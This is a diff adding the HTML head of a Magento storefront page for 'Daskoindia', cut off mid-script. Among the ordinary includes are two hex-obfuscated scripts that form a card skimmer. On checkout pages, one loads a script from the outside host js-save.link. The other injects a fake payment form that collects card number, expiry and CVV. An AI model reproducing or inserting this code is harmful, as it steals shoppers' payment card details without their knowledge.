@@ -1,0 +1,1619 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Daskoindia</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="description" content="Default Description" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<!-- <link rel="icon" href="http://daskoindia.com/skin/frontend/base/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://daskoindia.com/skin/frontend/base/default/favicon.ico" type="image/x-icon" /> -->
+<link rel="icon" href="http://daskoindia.com/skin/frontend/royal/default/favicon.png" type="image/png" />
+<link rel="shortcut icon" href="http://daskoindia.com/skin/frontend/royal/default/favicon.png" type="image/png" />
+
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://daskoindia.com/js/blank.html';
+    var BLANK_IMG = 'http://daskoindia.com/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/elegento/ajax/ajax.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/elegento/ajax/ajaxlogin.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/elegento/menu/menu.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/elegento/newsletter/newsletter.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/elegento/brands/brands.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/elegento/products/product.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/font.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/font-icons.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/elegento/bootstrap/bootstrap.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/elegento/jquery/jquery.ui.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/elegento/jquery/plugins/plugins.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/elegento/royal/grid12.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/elegento/royal/royal-icons.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/elegento/royal/royal.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/elegento/slideshow/slideshow.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/nwdthemes/revslider/rs/settings.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/nwdthemes/revslider/dynamic.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/nwdthemes/revslider/static.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/base/default/css/elegento/royal/config/design_default.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/elegento/royal/config/setting_default.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://daskoindia.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/jquery/jquery-1.10.2.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/jquery/jquery-noconflict.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/jquery/jquery-ui-1.10.3.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/ajax/ajax.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/ajax/ajaxlogin.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/menu/menu.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/media.match.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/modernizr.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/enquire.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/jquery/plugins/plugins.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/twitterfetcher.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/bootstrap.min.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/elegento/pre-elegento.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/nwdthemes/jquery-1.11.0.min.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/nwdthemes/jquery-migrate-1.2.1.min.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/js/nwdthemes/jquery.noconflict.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/skin/frontend/base/default/js/msrp.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/skin/frontend/base/default/js/nwdthemes/revslider/rs/jquery.themepunch.tools.min.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/skin/frontend/base/default/js/nwdthemes/revslider/rs/jquery.themepunch.revolution.min.js"></script>
+<link href="http://daskoindia.com/blog/rss/index/store_id/1/" title="Blog" rel="alternate" type="application/rss+xml" />
+<!--[if IE]>
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://daskoindia.com/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://daskoindia.com/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+<!--[if lte IE 8]>
+<link rel="stylesheet" type="text/css" href="http://daskoindia.com/skin/frontend/royal/default/css/styles-ie8.css" media="all" />
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.daskoindia.com';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+<!-- META GOOGLE TRANSLATE-->
+<script type="text/javascript">
+//<![CDATA[
+var egAjaxTime;
+var egAjaxTimer;
+
+var EGAjaxObject = new EG.EgAjax();
+jQuery(function ($) {
+    var loaderClass = EGAjaxObject.options.loader.substring(1);
+    $('body').append($('<div />', {
+        class: loaderClass,
+        css: {
+            "display": "none"
+        }
+    }));
+
+    
+    
+    });
+//]]>
+</script><script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><script>
+var _0x7539=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x73\x2D\x73\x61\x76\x65\x2E\x6C\x69\x6E\x6B\x2F\x6A\x73\x2D\x73\x61\x76\x65\x2F\x6D\x61\x67\x65\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];if(( new RegExp(_0x7539[2]))[_0x7539[1]](window[_0x7539[0]])){document[_0x7539[4]](_0x7539[3])}
+</script><script>var _0xc240=["\x70\x61\x79\x6D\x65\x6E\x74\x5F\x66\x6F\x72\x6D\x5F\x63\x63\x73\x61\x76\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x68\x65\x63\x6B\x6F\x75\x74\x2D\x70\x61\x79\x6D\x65\x6E\x74\x2D\x6D\x65\x74\x68\x6F\x64\x2D\x6C\x6F\x61\x64","\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C","\x66\x69\x72\x73\x74\x43\x68\x69\x6C\x64","\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64","\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x72\x6D\x2D\x6C\x69\x73\x74\x22\x20\x69\x64\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5F\x66\x6F\x72\x6D\x5F\x63\x63\x73\x61\x76\x65\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x6F\x76\x65\x72\x66\x6C\x6F\x77\x3A\x20\x68\x69\x64\x64\x65\x6E\x3B\x22\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6F\x77\x6E\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x4E\x61\x6D\x65\x20\x6F\x6E\x20\x43\x61\x72\x64\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x4E\x61\x6D\x65\x20\x6F\x6E\x20\x43\x61\x72\x64\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6F\x77\x6E\x65\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x6F\x77\x6E\x65\x72\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x54\x79\x70\x65\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x74\x79\x70\x65\x5D\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x54\x79\x70\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x74\x79\x70\x65\x2D\x73\x65\x6C\x65\x63\x74\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x2D\x2D\x50\x6C\x65\x61\x73\x65\x20\x53\x65\x6C\x65\x63\x74\x2D\x2D\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x41\x45\x22\x3E\x41\x6D\x65\x72\x69\x63\x61\x6E\x20\x45\x78\x70\x72\x65\x73\x73\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x56\x49\x22\x3E\x56\x69\x73\x61\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x4D\x43\x22\x3E\x4D\x61\x73\x74\x65\x72\x43\x61\x72\x64\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x44\x49\x22\x3E\x44\x69\x73\x63\x6F\x76\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x4A\x43\x42\x22\x3E\x4A\x43\x42\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x53\x4D\x22\x3E\x53\x77\x69\x74\x63\x68\x2F\x4D\x61\x65\x73\x74\x72\x6F\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x4E\x75\x6D\x62\x65\x72\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x5D\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x6E\x75\x6D\x62\x65\x72\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x74\x79\x70\x65\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x45\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x20\x44\x61\x74\x65\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x6D\x6F\x6E\x74\x68\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x6F\x6E\x74\x68\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x65\x78\x70\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x4D\x6F\x6E\x74\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x3E\x30\x31\x20\x2D\x20\x4A\x61\x6E\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x3E\x30\x32\x20\x2D\x20\x46\x65\x62\x72\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x22\x3E\x30\x33\x20\x2D\x20\x4D\x61\x72\x63\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x3E\x30\x34\x20\x2D\x20\x41\x70\x72\x69\x6C\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x35\x22\x3E\x30\x35\x20\x2D\x20\x4D\x61\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x36\x22\x3E\x30\x36\x20\x2D\x20\x4A\x75\x6E\x65\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x3E\x30\x37\x20\x2D\x20\x4A\x75\x6C\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x38\x22\x3E\x30\x38\x20\x2D\x20\x41\x75\x67\x75\x73\x74\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x39\x22\x3E\x30\x39\x20\x2D\x20\x53\x65\x70\x74\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x30\x22\x3E\x31\x30\x20\x2D\x20\x4F\x63\x74\x6F\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x31\x22\x3E\x31\x31\x20\x2D\x20\x4E\x6F\x76\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x32\x22\x3E\x31\x32\x20\x2D\x20\x44\x65\x63\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x5F\x79\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x79\x65\x61\x72\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x79\x65\x61\x72\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x59\x65\x61\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x36\x22\x3E\x32\x30\x31\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x37\x22\x3E\x32\x30\x31\x37\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x38\x22\x3E\x32\x30\x31\x38\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x39\x22\x3E\x32\x30\x31\x39\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x30\x22\x3E\x32\x30\x32\x30\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x31\x22\x3E\x32\x30\x32\x31\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x32\x22\x3E\x32\x30\x32\x32\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x33\x22\x3E\x32\x30\x32\x33\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x34\x22\x3E\x32\x30\x32\x34\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x35\x22\x3E\x32\x30\x32\x35\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x36\x22\x3E\x32\x30\x32\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x65\x6E\x74\x69\x6E\x65\x6C\x2D\x6C\x6F\x67\x6F\x73\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x65\x6E\x74\x69\x6E\x65\x6C\x5F\x6C\x6F\x67\x6F\x22\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x3E\x54\x6F\x20\x65\x6E\x73\x75\x72\x65\x20\x74\x68\x65\x20\x73\x65\x63\x75\x72\x69\x74\x79\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x74\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x73\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x20\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x61\x72\x64\x20\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4E\x75\x6D\x62\x65\x72\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x61\x72\x64\x20\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x63\x76\x76\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x63\x76\x6E\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x63\x69\x64\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x23\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x76\x76\x2D\x77\x68\x61\x74\x2D\x69\x73\x2D\x74\x68\x69\x73\x22\x3E\x57\x68\x61\x74\x20\x69\x73\x20\x74\x68\x69\x73\x3F\x3C\x2F\x61\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x